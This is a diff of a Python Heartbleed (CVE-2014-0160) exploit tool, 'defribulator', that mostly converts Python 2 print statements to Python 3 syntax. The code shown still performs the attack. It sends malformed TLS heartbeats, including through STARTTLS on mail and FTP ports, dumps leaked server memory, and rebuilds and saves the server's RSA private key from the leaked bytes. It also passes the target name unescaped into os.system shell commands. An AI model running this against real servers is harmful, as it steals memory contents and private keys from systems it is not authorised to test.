@@ -21,6 +21,7 @@
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
 
+from __future__ import print_function
 import sys
 import struct
 import socket
@@ -122,10 +123,10 @@ if opts.rawoutfile:
 
 if opts.asciioutfile:
     asciifileOUT = open(opts.asciioutfile, "a")
-    
+
 if opts.extractkey:
     opts.donotdisplay = True
-    
+
 def hexdump(s):
     pdat = ''
     hexd = ''
@@ -149,20 +150,20 @@ def rcv_tls_record(s):
     try:
         tls_header = s.recv(5)
         if not tls_header:
-            print 'Unexpected EOF (header)' 
-            return None,None,None        
+            print('Unexpected EOF (header)')
+            return None,None,None
         typ,ver,length = struct.unpack('>BHH',tls_header)
         message = ''
         while len(message) != length:
             message += s.recv(length-len(message))
         if not message:
-            print 'Unexpected EOF (message)'
+            print('Unexpected EOF (message)')
             return None,None,None
         if opts.verbose:
-	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)
+	        print('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))
         return typ,ver,message
     except Exception as e:
-        print "\nError Receiving Record! " + str(e)
+        print("\nError Receiving Record! " + str(e))
         return None,None,None
 
 def hit_hb(s, targ, firstrun, supported):
@@ -170,15 +171,15 @@ def hit_hb(s, targ, firstrun, supported):
     while True:
         typ, ver, pay = rcv_tls_record(s)
         if typ is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            print('No heartbeat response received, server likely not vulnerable')
             return ''
 
         if typ == 24:
             if opts.verbose:
-                print 'Received heartbeat response...'
+                print('Received heartbeat response...')
             if len(pay) > 3:
                 if firstrun or opts.verbose:
-                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'
+                    print('\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!')
                 if opts.rawoutfile:
                     rawfileOUT.write(pay)
                 if opts.extractkey:
@@ -186,12 +187,12 @@ def hit_hb(s, targ, firstrun, supported):
                 else:
 	                return hexdump(pay)
             else:
-                print 'Server processed malformed heartbeat, but did not return any extra data.'
+                print('Server processed malformed heartbeat, but did not return any extra data.')
 
         if typ == 21:
-            print 'Received alert:'
+            print('Received alert:')
             return hexdump(pay)
-            print 'Server returned error, likely not vulnerable'
+            print('Server returned error, likely not vulnerable')
             return ''
 
 
@@ -205,65 +206,65 @@ def conn(targ, port):
         return s
 
     except Exception as e:
-       print "Connection Error! " + str(e)
+       print("Connection Error! " + str(e))
        return None
-       
+
 def bleed(targ, port):
     try:
         res = ''
         firstrun = True
-        print '\n##################################################################'
-        print 'Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times'
+        print('\n##################################################################')
+        print('Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times')
         for x in range(0, opts.num):
             if x > 0:
                 firstrun = False
-            
+
             if x == 0 and opts.extractkey:
-                print "Attempting to extract private key from returned data..."
+                print("Attempting to extract private key from returned data...")
                 if not os.path.exists('./hb-certs'):
                     os.makedirs('./hb-certs')
-                print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'
-                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')	
-                print '\nExtracting modulus from cert...\n'
+                print('\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n')
+                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')
+                print('\nExtracting modulus from cert...\n')
                 os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem > hb-certs/sslcert_' + targ + '_pubkey.pem')
                 output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')
                 modulus = output.read()
-            
+
             s = conn(targ, port)
             if not s:
                 continue
 
             # send starttls command if specified as an option or if common smtp/pop3/imap ports are used
             if (opts.starttls) or (port in {25, 587, 110, 143, 21}):
-                
+
                 stls = False
                 atls = False
-                
+
                 # check if smtp supports starttls/stls
                 if port in {25, 587}:
-                    print 'SMTP Port... Checking for STARTTLS Capability...'
+                    print('SMTP Port... Checking for STARTTLS Capability...')
                     check = s.recv(1024)
                     s.send("EHLO someone.org\n")
                     sys.stdout.flush()
                     check += s.recv(1024)
                     if opts.verbose:
-                        print check
-                                        
+                        print(check)
+
                     if "STARTTLS" in check:
                         opts.starttls = True
-                        print "STARTTLS command found"
+                        print("STARTTLS command found")
                     elif "STLS" in check:
                         opts.starttls = True
                         stls = True
-                        print "STLS command found"
+                        print("STLS command found")
                     else:
-                        print "STARTTLS command NOT found!"
-                        print '##################################################################'
+                        print("STARTTLS command NOT found!")
+                        print('##################################################################')
                         return
-                
-                # check if pop3/imap supports starttls/stls                            
+
+                # check if pop3/imap supports starttls/stls
                 elif port in {110, 143}:
-                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'
+                    print ('POP3/IMAP4 Port... Checking for STARTTLS Capability...')
                     check = s.recv(1024)
                     if port == 110:
                         s.send("CAPA\n")
@@ -272,56 +273,56 @@ def bleed(targ, port):
                     sys.stdout.flush()
                     check += s.recv(1024)
                     if opts.verbose:
-                        print check
+                        print(check)
                                            
                     if "STARTTLS" in check:
                         opts.starttls = True
-                        print "STARTTLS command found"
+                        print("STARTTLS command found")
                     elif "STLS" in check:
                         opts.starttls = True
                         stls = True
-                        print "STLS command found"
+                        print("STLS command found")
                     else:
-                        print "STARTTLS command NOT found!"
-                        print '##################################################################'
+                        print("STARTTLS command NOT found!")
+                        print('##################################################################')
                         return
                         
                 # check if ftp supports auth tls/starttls                          
                 elif port in {21}:
-                    print 'FTP Port... Checking for AUTH TLS Capability...'
+                    print('FTP Port... Checking for AUTH TLS Capability...')
                     check = s.recv(1024)
                     s.send("FEAT\n")
                     sys.stdout.flush()
                     check += s.recv(1024)
                     if opts.verbose:
-                        print check
+                        print(check)
                         
                     if "STARTTLS" in check:
                         opts.starttls = True
-                        print "STARTTLS command found"
+                        print("STARTTLS command found")
                     elif "AUTH TLS" in check:
                         opts.starttls = True
                         atls = True
-                        print "AUTH TLS command found"
+                        print("AUTH TLS command found")
                     else:
-                        print "STARTTLS command NOT found!"
-                        print '##################################################################'
+                        print("STARTTLS command NOT found!")
+                        print('##################################################################')
                         return
                                         
                 # send appropriate tls command if supported                        
                 if opts.starttls:
                     sys.stdout.flush()
                     if stls:
-                        print 'Sending STLS Command...'
+                        print('Sending STLS Command...')
                         s.send("STLS\n")
                     elif atls:
-                        print 'Sending AUTH TLS Command...'
+                        print('Sending AUTH TLS Command...')
                         s.send("AUTH TLS\n")
                     else:
-                        print 'Sending STARTTLS Command...'
+                        print('Sending STARTTLS Command...')
                         s.send("STARTTLS\n")
                     if opts.verbose:
-                        print 'Waiting for reply...'
+                        print('Waiting for reply...')
                     sys.stdout.flush()
                     rcv_tls_record(s)
 
@@ -329,34 +330,34 @@ def bleed(targ, port):
             for num,tlsver in tls_versions.items():
                 
                 if firstrun:
-                    print 'Sending Client Hello for {}'.format(tlsver)
+                    print('Sending Client Hello for {}'.format(tlsver))
                 s.send(hex2bin(build_client_hello(num)))
                 
                 if opts.verbose:
-                    print 'Waiting for Server Hello...'
+                    print('Waiting for Server Hello...')
                 
                 while True:
                     typ,ver,message = rcv_tls_record(s)
                     if not typ:
                         if opts.verbose:
-                            print 'Server closed connection without sending ServerHello for {}'.format(tlsver)
+                            print('Server closed connection without sending ServerHello for {}'.format(tlsver))
                         s.close()
                         s = conn(targ, port)
                         break
                     if typ == 22 and ord(message[0]) == 0x0E:
                         if firstrun:
-                            print 'Received Server Hello for {}'.format(tlsver)
+                            print('Received Server Hello for {}'.format(tlsver))
                         supported = True
                         break
                 if supported: break
 
             if not supported:
-                print '\nError! No TLS versions supported!'
-                print '##################################################################'
+                print('\nError! No TLS versions supported!')
+                print('##################################################################')
                 return
 
             if opts.verbose:
-                print '\nSending heartbeat request...'
+                print('\nSending heartbeat request...')
             sys.stdout.flush()
             
             keyfound = False
@@ -374,14 +375,14 @@ def bleed(targ, port):
                 sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))
                 sys.stdout.flush()
         
-        print '\n##################################################################'
-        print       
+        print('\n##################################################################')
+        print()
         return res
     
     except Exception as e:
-       print "Error! " + str(e)
-       print '##################################################################'
-       print               
+       print("Error! " + str(e))
+       print('##################################################################')
+       print()
 
 def extractkey(host, chunk, modulus):
 	
@@ -393,7 +394,7 @@ def extractkey(host, chunk, modulus):
         p = long (''.join (["%02x" % ord (chunk[x]) for x in xrange (offset + keysize - 1, offset - 1, -1)]).strip(), 16)
         if gmpy.is_prime (p) and p != n and n % p == 0:
             if opts.verbose:
-                print '\n\nFound prime: ' + str(p)
+                print('\n\nFound prime: ' + str(p))
             e = 65537
             q = n / p
             phi = (p - 1) * (q - 1)
@@ -404,7 +405,7 @@ def extractkey(host, chunk, modulus):
             seq = Sequence()
             for x in [0, n, e, d, p, q, dp, dq, qinv]:
                 seq.setComponentByPosition (len (seq), Integer (x))
-            print "\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq))
+            print("\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq)))
             privkeydump = open("hb-certs/privkey_" + host + ".dmp", "a")
             privkeydump.write(chunk)
             return True
@@ -413,8 +414,8 @@ def extractkey(host, chunk, modulus):
 
 def main():
 
-    print "\ndefribulator v1.16"
-    print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"
+    print("\ndefribulator v1.16")
+    print("A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)")
     allresults = ''
                     
     # if a file is specified, loop through file
@@ -429,7 +430,7 @@ def main():
                 allresults = bleed(targetinfo[0], opts.port)
             
             if allresults and (not opts.donotdisplay):
-                print '%s' % (allresults)
+                print('%s' % (allresults))
 
         fileIN.close()
 
@@ -439,9 +440,9 @@ def main():
             return
         allresults = bleed(args[0], opts.port)
         if allresults and (not opts.donotdisplay):
-            print '%s' % (allresults)
+            print('%s' % (allresults))
     
-    print
+    print()
     
     if opts.rawoutfile:
         rawfileOUT.close()
